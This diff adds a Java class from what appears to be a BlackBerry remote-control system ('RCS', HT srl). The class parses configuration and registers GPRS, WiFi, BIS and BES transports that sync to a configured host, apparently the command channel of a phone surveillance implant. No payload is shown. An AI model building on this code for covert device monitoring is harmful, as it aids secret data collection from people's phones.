@@ -1,0 +1,126 @@
+//#preprocess
+/* *************************************************
+ * Copyright (c) 2010 - 2010
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : SyncAction.java
+ * Created      : 26-mar-2010
+ * *************************************************/
+package blackberry.action.sync;
+
+import java.io.EOFException;
+
+import net.rim.device.api.system.DeviceInfo;
+import net.rim.device.api.util.DataBuffer;
+import blackberry.action.sync.transport.BesTransport;
+import blackberry.action.sync.transport.BisTransport;
+import blackberry.action.sync.transport.GprsTransport;
+import blackberry.action.sync.transport.WifiTransport;
+import blackberry.config.Conf;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
+import blackberry.utils.Check;
+import blackberry.utils.WChar;
+
+public class SyncActionInternet extends SyncAction {
+    //#ifdef DEBUG
+    private static Debug debug = new Debug("SyncActionInt",
+            DebugLevel.VERBOSE);
+    //#endif
+
+    protected boolean wifiForced;
+    protected boolean wifi;
+    protected boolean gprs;
+    protected boolean bis;
+    protected boolean bes;
+
+    String host;
+
+    public SyncActionInternet(final int actionId_, final byte[] confParams) {
+        super(actionId_, confParams);
+
+        //#ifdef DBC
+        Check.requires(actionId == ACTION_SYNC_INTERNET, "Wrong ActionId");
+        //#endif
+    }
+
+    protected boolean parse(final byte[] confParams) {
+        final DataBuffer databuffer = new DataBuffer(confParams, 0,
+                confParams.length, false);
+
+        try {
+            gprs = databuffer.readInt() == 1;
+            wifi = databuffer.readInt() == 1;
+
+            if (Conf.SYNCACTION_FORCE_WIFI) {
+                wifiForced = wifi;
+            } else {
+                wifiForced = false;
+            }
+            
+            bis=gprs;
+            bes=gprs;
+            
+
+            final int len = databuffer.readInt();
+            final byte[] buffer = new byte[len];
+            databuffer.readFully(buffer);
+
+            host = WChar.getString(buffer, true);
+
+        } catch (final EOFException e) {
+            //#ifdef DEBUG
+            debug.error("params FAILED");
+            //#endif
+            return false;
+        }
+
+        //#ifdef DEBUG
+        final StringBuffer sb = new StringBuffer();
+        sb.append("gprs: " + gprs);
+        sb.append(" wifi: " + wifi);
+        sb.append(" wifiForced: " + wifiForced);
+        sb.append(" host: " + host);
+        debug.trace(sb.toString());
+        //#endif
+
+        return true;
+    }
+
+    public String toString() {
+        return "SyncInternet ";
+    }
+
+    protected boolean initTransport() {        
+        if (DeviceInfo.isSimulator()) {
+            //#ifdef DEBUG
+            debug.trace("initTransport adding GprsTransport");
+            //#endif
+             transports.addElement(new GprsTransport(host));
+         }
+        
+        if (wifi) { 
+            //#ifdef DEBUG
+            debug.trace("initTransport adding WifiTransport");
+            //#endif
+            transports.addElement(new WifiTransport(host, wifiForced));
+        }
+
+        if (bis) {
+            //#ifdef DEBUG
+            debug.trace("initTransport adding BisTransport");
+            //#endif
+            transports.addElement(new BisTransport(host));
+        }
+        
+        if (bes) {
+            //#ifdef DEBUG
+            debug.trace("initTransport adding BesTransport");
+            //#endif
+            transports.addElement(new BesTransport(host));
+        }
+        
+        return true;
+    }
+
+}
